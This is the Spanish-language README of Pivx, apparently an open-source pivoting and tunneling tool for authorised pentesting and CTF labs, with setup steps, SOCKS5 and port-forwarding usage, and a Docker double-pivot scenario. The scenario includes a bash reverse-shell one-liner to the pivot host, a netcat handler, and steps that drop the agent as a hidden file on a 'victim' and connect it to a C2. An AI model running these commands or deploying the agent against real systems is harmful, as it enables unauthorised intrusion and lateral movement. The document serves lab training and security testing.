# Pivx 🕸️

Herramienta de **pivoting y enrutamiento de red** para pentesting autorizado.
Objetivo: mejor usabilidad que Ligolo-ng, con enrutamiento automatizado y una
UI web desde el primer día.

> **Fase 3 (actual):** suite de pivoting para CTF.
> - **L3:** túnel **TUN** `pivx0` + bombeo de paquetes + rutas (netstack gVisor en el agente).
> - **L4:** port forwarding **local (-L)** y **remote (-R)** multiplexado sobre el mismo WS.
> - **L7:** proxy **SOCKS5** dinámico (resolución DNS del lado del agente).
> - Data-plane endurecido (MTU 1350, backpressure) y **Makefile** de cross-build.
> - Framing híbrido: control = frames de texto (JSON); datos = frames binarios,
>   diferenciando **túnel L3** (nibble IP `4`/`6`) de **canal MUX** (`0x01`) por el primer byte.
>
> Ver [`ARCHITECTURE.md`](ARCHITECTURE.md) para el diseño completo.

```
Pivx/
├── Makefile                  # Cross-build del agente (linux/amd64, arm64, win/amd64)
├── agent/                    # Agente en Go
│   ├── go.mod
│   ├── main.go               # Transporte WS + control + descubrimiento (anti-uplink)
│   ├── netstack.go           # Pila gVisor (userland) + forwarders TCP/UDP (túnel L3)
│   └── mux.go                # Multiplexado de streams TCP (L4/L7) sobre el mismo WS
├── server/
│   ├── app.py                # Dashboard Streamlit (túnel + rutas + forwarding + SOCKS)
│   ├── requirements.txt
│   └── pivx_server/
│       ├── db.py             # Persistencia DuckDB (agents, routes, logs)
│       ├── tun.py            # Interfaz TUN de Linux (raw-IP, MTU 1350)
│       ├── runtime.py        # Orquestación TUN <-> WebSocket (plano L3)
│       ├── forward.py        # Capa MUX: port-forwarding L4 + SOCKS5 (plano L4/L7)
│       └── ws_server.py      # Listener WebSocket (control + datos + demux L3/MUX)
├── ARCHITECTURE.md
└── README.md
```

## Requisitos

- **Servidor:** Linux o **WSL2** (la TUN usa `/dev/net/tun`). Se necesita **root**
  (o `CAP_NET_ADMIN`) para crear la interfaz y añadir rutas.
- **Agente:** No necesitas Go instalado si descargas el binario desde
  [Releases](https://github.com/HangLoose84/Pivx/releases). Solo Go 1.22+ si
  quieres compilar desde el código fuente.

## Puesta en marcha

### 1) Servidor (Python, en Linux/WSL2)

> **Nota para Kali Linux y distribuciones modernas:** Python 3.11+ marca los
> paquetes del sistema como `externally-managed-environment` y bloquea `pip
> install` global. Pivx usa un **entorno virtual (`venv`)** para evitar este
> error. El script `install.sh` lo crea automáticamente.

**Instalación rápida (< 2 minutos):**

```bash
git clone https://github.com/HangLoose84/Pivx.git
cd Pivx
chmod +x install.sh
./install.sh
```

**Arrancar el C2:**

```bash
sudo server/venv/bin/streamlit run server/app.py
```

`sudo` es necesario porque el servidor crea la interfaz TUN `/dev/net/tun` y
manipula la tabla de rutas del kernel. Al invocar directamente el `streamlit`
del venv no hace falta `sudo -E` ni activar el entorno manualmente.

El listener WebSocket queda en `ws://0.0.0.0:8765` y la UI en http://localhost:8501.

### 2) Agente

> **No necesitas tener Go instalado ni compilar nada** si solo quieres usar
> Pivx. Descarga el binario precompilado de la pestaña
> [**Releases**](https://github.com/HangLoose84/Pivx/releases) del repositorio
> y súbelo directamente a la máquina víctima:
>
> ```bash
> # Desde la máquina víctima (ejemplo con wget):
> wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
> chmod +x /tmp/.p
> /tmp/.p --server ws://TU_C2:8765
> ```
>
> Binarios disponibles: `pivx-agent-linux-amd64`, `pivx-agent-linux-arm64`,
> `pivx-agent-windows-amd64.exe`.

#### Compilación desde el código fuente (usuarios avanzados)

Si prefieres compilar el agente tú mismo, necesitas **Go 1.22+**.

Primera vez — obtener gVisor (rama especial `go`) y resolver dependencias:

```bash
cd agent
go get gvisor.dev/gvisor@go
go mod tidy
```

Ejecutar directamente apuntando al servidor:

```bash
go run . --server ws://127.0.0.1:8765
```

#### Compilación con el `Makefile` (recomendado)

Desde la **raíz del proyecto** hay un `Makefile` que cross-compila binarios
estáticos y **despojados** (`-ldflags="-s -w"` + `-trimpath`, sin símbolos ni
DWARF) para reducir al máximo el peso — clave para subir el agente a un target
por una conexión inestable en un CTF.

```bash
make deps          # UNA sola vez: obtiene gVisor (rama `go`) y ordena módulos
make               # compila las 3 plataformas en ./dist
```

Targets individuales:

```bash
make linux-amd64     # -> dist/pivx-agent-linux-amd64
make linux-arm64     # -> dist/pivx-agent-linux-arm64
make windows-amd64   # -> dist/pivx-agent-windows-amd64.exe
make clean           # borra ./dist
```

Los binarios usan `CGO_ENABLED=0` (estáticos, sin dependencia de libc en el
target). Ejemplo de despliegue:

```bash
scp dist/pivx-agent-linux-amd64 target:/tmp/.p
ssh target '/tmp/.p --server ws://TU_C2:8765'
```

### 3) Levantar el túnel y enrutar

1. En el dashboard, sección **Túnel de datos**, elige el agente y pulsa
   **Iniciar túnel** (crea `pivx0`).
2. En **Rutas**, añade la subred interna: con un clic en las **subredes
   descubiertas** por el agente, o a mano (`10.10.20.0/24`).
3. Ahora tus herramientas locales alcanzan la red interna a través del agente:

```bash
nmap -sT -Pn 10.10.20.0/24    # TCP connect + sin ping (ver "Limitaciones" abajo)
curl http://10.10.20.5/
```

> El escaneo debe ser **TCP connect** (`-sT`), no SYN crudo: el proxy opera a
> nivel de socket, no de paquete SYN. Y **siempre `-Pn`**: no hay ICMP a través
> del túnel, así que sin `-Pn` nmap creerá que todo está caído. Ver abajo.

### 4) Verificación

- El agente aparece **online** con su hostname/OS/arch y sus subredes.
- Al iniciar el túnel, `ip addr` en el servidor muestra `pivx0`; `ip route` muestra
  las subredes enrutadas a `pivx0`.
- El tráfico hacia la LAN interna funciona y aparecen líneas `[tcp] proxy
  establecido -> ...` en el log del agente.

### 5) Port forwarding (L4) y SOCKS5 (L7)

Además del túnel L3 (rutas), Pivx multiplexa **streams TCP** sobre el mismo
WebSocket. Estas funciones **no requieren tener el túnel L3 activo**: basta con
un agente conectado. En el dashboard, sección **🔀 Port forwarding (L4)**.

#### Local forward (`-L`) — exponer un servicio interno en tu máquina

Pestaña **Local (-L)**. El servidor abre un puerto en tu máquina y el agente
marca hacia un `IP:puerto` de la red interna.

- **Bind local:** `127.0.0.1` · **Puerto:** `8080` · **Destino (agente):** `10.10.20.5:80`

Ahora `127.0.0.1:8080` en tu equipo == `10.10.20.5:80` en la víctima:

```bash
curl http://127.0.0.1:8080/           # llega al :80 interno vía el agente
```

Útil para abrir en el navegador un panel interno, una BBDD (`...:3306`), RDP, etc.

#### Remote forward (`-R`) — recibir reverse shells desde la víctima

Pestaña **Remote (-R)**. El **agente** abre un puerto en la red víctima y todo lo
que llegue ahí se reenvía a un destino local tuyo (tu handler).

- **Bind víctima:** `0.0.0.0:4444` · **Destino local:** `127.0.0.1:5555`

Prepara tu listener y lanza el payload apuntando al agente:

```bash
# En tu C2:
nc -lvnp 5555
# En la víctima (o el payload), conecta a la IP del agente en el puerto 4444.
# Ese tráfico sale por el túnel y aterriza en tu 127.0.0.1:5555.
```

#### SOCKS5 (L7) — proxy dinámico para herramientas web

Sub-sección **🧦 Proxy SOCKS5**. Pulsa **Iniciar SOCKS5** (por defecto
`127.0.0.1:1080`). La **resolución DNS y la conexión TCP las hace el agente**, así
que los nombres internos se resuelven en la red víctima y tu tráfico sale limpio.

Con `proxychains` (configura `/etc/proxychains4.conf` → `socks5 127.0.0.1 1080`):

```bash
proxychains -q curl http://intranet.victima.local/
proxychains -q smbclient -L //10.10.20.5/
```

Directo en las herramientas que soportan SOCKS:

```bash
# ffuf / dirsearch / feroxbuster
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.5/FUZZ -w wordlist.txt
dirsearch -x 500 --proxy socks5://127.0.0.1:1080 -u http://10.10.20.5/
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.5/   # --socks5-hostname = DNS remoto
```

**Burp Suite:** *Settings → Network → Connections → SOCKS proxy* →
host `127.0.0.1`, puerto `1080`, marca *"Do DNS lookups over SOCKS proxy"*. A
partir de ahí, todo el tráfico de Burp hacia la red interna va por el agente.

> SOCKS5 solo hace **CONNECT** sobre **TCP**. Para el descubrimiento con nmap a
> través de proxychains sigue aplicando `-sT` (y añade `-Pn`): `proxychains -q
> nmap -sT -Pn -p 80,443,445 10.10.20.5`.

---

## Escenario Práctico: Doble Salto hacia Redes Aisladas

Ejemplo real probado con Docker: comprometer una máquina que **no tiene salida
a internet** a través de un host pivote que hace puente entre dos redes.

### Topología

```
  Tu máquina (Kali)          Red pública              Red interna (aislada)
  ┌─────────────┐          ┌─────────────┐          ┌──────────────────┐
  │  Pivx C2    │◄── WS ──►│  Pivote      │          │  Target          │
  │  10.10.10.10│          │  10.10.10.20 │──────────│  10.10.20.100    │
  │             │          │  10.10.20.20 │          │  (sin internet)  │
  └─────────────┘          └─────────────┘          └──────────────────┘
    SOCKS5 :1080             Agente Pivx               HTTP :80
    Handler :9001            rforward :4444
```

El C2 **no puede alcanzar** `10.10.20.0/24` directamente. Pivx lo resuelve.

### Paso 1 — Subir y ejecutar el agente en el host pivote

```bash
# Desde tu C2, sube el agente al pivote (que sí tiene salida):
scp dist/pivx-agent-linux-amd64 usuario@10.10.10.20:/tmp/.p

# En el pivote:
chmod +x /tmp/.p
/tmp/.p --server ws://10.10.10.10:8765
```

El agente se conecta al C2, reporta sus interfaces y descubre la subred
`10.10.20.0/24`. El dashboard lo muestra como **online**.

### Paso 2 — Alcanzar la red aislada con SOCKS5 (inbound)

En el dashboard, sección **Proxy SOCKS5**, pulsa **Iniciar SOCKS5**
(`127.0.0.1:1080`). Ahora puedes alcanzar máquinas de la red interna:

```bash
# Escanear puertos del target aislado:
proxychains -q nmap -sT -Pn -p 22,80,443,445 10.10.20.100

# Navegar el servicio web interno:
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.100/

# Fuzzing de directorios:
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.100/FUZZ -w wordlist.txt

# Burp Suite: Settings → Network → SOCKS proxy → 127.0.0.1:1080
#   (marca "Do DNS lookups over SOCKS proxy")
```

El tráfico fluye: `tu herramienta → SOCKS5 :1080 → MUX → pivote → 10.10.20.100`.
La resolución DNS y la conexión TCP ocurren **del lado del pivote**, así que los
nombres internos se resuelven en la red víctima.

### Paso 3 — Recibir reverse shells con remote forward (outbound)

El target aislado no puede conectarse a tu C2, pero sí al pivote. Usa
**remote forward** para que el pivote reenvíe las conexiones a tu máquina:

```bash
# 1) En el dashboard: sección "Port forwarding (L4)" → pestaña "Remote (-R)"
#    Bind víctima: 0.0.0.0:4444
#    Destino local: 127.0.0.1:9001
#    → Clic en "Crear"

# 2) Prepara tu handler en el C2:
nc -lvnp 9001

# 3) Ejecuta el payload en el target apuntando al pivote:
#    (ejemplo: reverse shell bash, o cualquier payload que conecte a pivote:4444)
bash -i >& /dev/tcp/10.10.20.20/4444 0>&1
```

El tráfico fluye: `target → pivote:4444 → MUX → C2:9001`. Tu handler
recibe la shell como si viniera de `127.0.0.1`.

### Resultado verificado

Este escenario se probó con tests automatizados en Docker (3 contenedores,
2 redes aisladas). Resultados:

| Test | Resultado | Latencia |
|------|-----------|----------|
| SOCKS5 inbound → target:80 | Respuesta HTTP 200 completa | ~25ms |
| Remote forward ← reverse shell | Payload recibido en C2:9001 | ~13s (espera del script) |
| Streams residuales tras cierre | 0 (sin leaks) | — |

---

## Alta Fidelidad y Evasion

Pivx implementa mejoras de fidelidad de red que hacen los escaneos
indistinguibles de conexiones nativas. Estas funciones se probaron en un
laboratorio Docker (3 contenedores, 2 redes aisladas) con resultados
verificados.

### Smartping (ICMP a traves del tunel)

A diferencia de otras herramientas de pivoting, Pivx soporta **ping real**
a traves del tunel L3. El agente intercepta ICMP Echo Request, ejecuta un
`ping` nativo del OS para verificar que el host esta vivo, y construye el
Echo Reply con checksums correctos.

```bash
# Desde tu C2, con el tunel y la ruta activos:
ping -c 2 10.10.20.100

PING 10.10.20.100 (10.10.20.100) 56(84) bytes of data.
64 bytes from 10.10.20.100: icmp_seq=1 ttl=64 time=5.03 ms
64 bytes from 10.10.20.100: icmp_seq=2 ttl=64 time=2.88 ms

--- 10.10.20.100 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
```

Esto permite usar `nmap` **sin `-Pn`** para descubrimiento de hosts: los
equipos que responden al ping aparecen como *up* y nmap escanea solo esos.

### Magic IP (acceso al localhost de la victima)

El rango reservado `240.0.0.0/4` (Class-E) se reescribe a `127.0.0.1` del
agente, tanto en el tunel L3 como via SOCKS5/MUX. Esto permite acceder a
servicios que solo escuchan en localhost (bases de datos, paneles admin,
APIs internas) sin conflictos de IP:

```bash
# Via SOCKS5 — accede al servidor HTTP oculto en localhost:8080 del agente:
curl --socks5-hostname 127.0.0.1:1080 http://240.0.0.1:8080/

# Respuesta: directory listing del filesystem del agente
<!DOCTYPE HTML>
<html lang="en">
<head><title>Directory listing for /</title></head>
...
```

Cualquier IP del rango `240.x.x.x` funciona: `240.0.0.1`, `240.1.2.3`, etc.
Todas se redirigen al `127.0.0.1` del agente.

### Escaneos SYN fieles (SYN-Cookies desactivadas)

Pivx desactiva las SYN-Cookies del netstack gVisor, evitando que el
netstack responda SYN-ACK a **todo** SYN sin crear estado. Sin esta
correccion, `nmap -sS` mostraria todos los puertos como *open*. Con ella,
solo los puertos realmente abiertos responden.

### RST inteligente

Cuando el agente intenta conectar a un puerto cerrado y recibe
`ECONNREFUSED`, devuelve un RST al escaner. Si el destino no responde
(timeout), no envia nada. Esto permite a nmap distinguir correctamente
entre puertos *closed* (RST) y *filtered* (sin respuesta).

### Kill Switch (terminacion remota del agente)

Desde el dashboard del C2, un clic en el boton Kill envia `{"type":"kill"}`
al agente, que ejecuta `os.Exit(0)` inmediatamente. La conexion WebSocket
se cierra y el dashboard refleja el cambio al instante.

### Resultados del test automatizado

| Test | Resultado | Detalle |
|------|-----------|---------|
| Smartping L3 (ping via tunel) | PASADO | 2/2 replies, ~4ms RTT |
| Magic IP L7 (240.0.0.1:8080 via SOCKS5) | PASADO | HTTP 200, directory listing |
| Kill Switch (os.Exit remoto) | PASADO | Desconexion en <1s |

---

## Limitaciones conocidas / Tips de uso

Léelo antes de escanear: evita perder tiempo persiguiendo "hosts caídos" que en
realidad sí están vivos.

### ICMP Smartping — `ping` funciona a traves del tunel

Pivx soporta **ping real** via el tunel L3 (ver seccion *Alta Fidelidad*).
El agente intercepta ICMP Echo Request, verifica el host con un ping del OS,
y responde con Echo Reply. Esto significa que **nmap puede descubrir hosts con
ICMP** sin necesidad de `-Pn` en la mayoria de redes.

**Modos de escaneo soportados:**

```bash
# Descubrimiento con ping (funciona gracias al Smartping):
nmap -sn 10.10.20.0/24

# SYN scan — el netstack procesa SYN a nivel de transporte y responde
# RST (cerrado) o SYN-ACK (abierto) segun el estado real del puerto:
nmap -sS 10.10.20.0/24

# TCP connect sigue funcionando como siempre:
nmap -sT 10.10.20.0/24
```

> **Nota:** El Smartping ejecuta un `ping` real por cada Echo Request, lo que
> anade ~3-5ms de latencia. Para escaneos masivos, `-Pn` sigue siendo mas
> rapido porque omite la fase de descubrimiento.

### Otras limitaciones actuales

- **Un solo túnel / un solo agente activo** a la vez (enfoque CTF). El
  multi-agente simultáneo queda **aplazado** (fuera del alcance de la Fase 3).
- **Sin TLS/wss ni autenticación** del agente todavía (Fase 4). No lo uses fuera
  de un laboratorio o red controlada.
- El **SOCKS5** solo implementa el comando **CONNECT** sobre TCP (sin BIND ni
  UDP ASSOCIATE), suficiente para escaneo/fuzzing/proxy web.
- Un agente que pierde la conexión sin cierre limpio pasa a **`offline`
  automáticamente** tras ~45 s sin pings (barrido de keep-alive del servidor).

## Notas y limitaciones (gVisor / entorno)

- **gVisor** tiene una API sensible a la versión; este código sigue la rama `go`.
  Si `go mod tidy` deja algún símbolo desalineado, ajusta los nombres en
  `netstack.go` a la versión resuelta.
- Aún **sin TLS/wss ni autenticación** del agente (Fase 4).
- No probado en Windows como servidor (se eligió Linux/WSL2 para la TUN).

⚠️ Úsese únicamente en sistemas propios o con **autorización explícita**.
